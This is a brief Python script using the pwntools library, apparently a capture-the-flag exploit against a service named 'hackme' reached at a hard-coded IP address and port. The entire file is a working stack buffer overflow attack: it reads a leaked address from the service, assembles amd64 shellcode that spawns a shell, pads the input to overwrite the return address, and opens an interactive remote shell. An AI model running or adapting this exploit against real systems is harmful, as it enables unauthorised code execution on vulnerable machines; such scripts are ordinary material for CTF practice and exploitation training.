# coding: utf-8
from pwn import *
#p = process("./hackme")
p = remote("207.154.239.148", 1337)
resp = p.recv()
import re
leak = re.findall(b"(0x[0-9a-f]{4,16})", resp)[0]
shellAddr = int(leak, 16) - 540
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + (520 - len(shellcode))*b"A" + p64(shellAddr)
p.sendline(payload)
p.interactive()
